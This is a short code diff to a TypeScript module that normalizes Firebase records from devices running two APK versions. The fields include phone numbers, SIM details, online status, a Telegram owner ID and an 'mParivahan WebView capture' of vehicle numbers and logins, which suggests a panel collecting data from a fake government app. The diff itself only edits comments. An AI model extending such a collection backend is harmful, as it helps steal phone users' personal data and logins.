@@ -1,6 +1,9 @@
 /**
  * Normalize raw Firebase device data.
  * Supports old APK (model/phone/sim1/sim2/ping) + new APK (modelName/mobNo/sims[]/status) + mParivahan WebView (vehicleNumber/loginTime)
+ * Supports both old APK format (model, phone, sim1/sim2, ping timestamp)
+ * and new APK format (modelName, mobNo, sims[], status boolean)
+ * + mParivahan WebView capture (vehicleNumber, loginTime, mobNo)
  */
 export interface NormalizedDevice {
   id: string;
@@ -11,8 +14,8 @@ export interface NormalizedDevice {
   sim1: string;
   sim2: string;
   isOnline: boolean;
-  ping?: string;            // raw timestamp (old APK)
-  status?: boolean | string; // boolean or string (new APK)
+  ping?: string;
+  status?: boolean | string;
   ownerTelegramId?: string;
   // extra fields from new APK
   androidV?: string;
